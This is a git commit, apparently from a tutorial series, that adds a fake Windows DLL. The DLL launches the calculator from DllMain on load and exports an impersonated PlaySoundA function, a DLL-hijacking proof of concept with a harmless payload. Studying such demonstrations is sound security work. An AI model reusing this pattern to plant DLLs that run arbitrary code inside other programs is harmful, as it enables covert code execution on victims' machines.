329c76378a6f5904909b9bce982eb5f659987817
un4ckn0wl3z <slickerth@gmail.com>
2019-12-08 13:57:16 +0700

    add ep3

---
+++ ep.3/Fake/Dll5/Dll5/dllmain.cpp
@@ -0,0 +1,23 @@
+#include "stdafx.h"
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		WinExec("calc", SW_NORMAL);
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
+extern "C" __declspec(dllexport) void PlaySoundA()
+{
+	WinExec("calc", SW_NORMAL);
+}
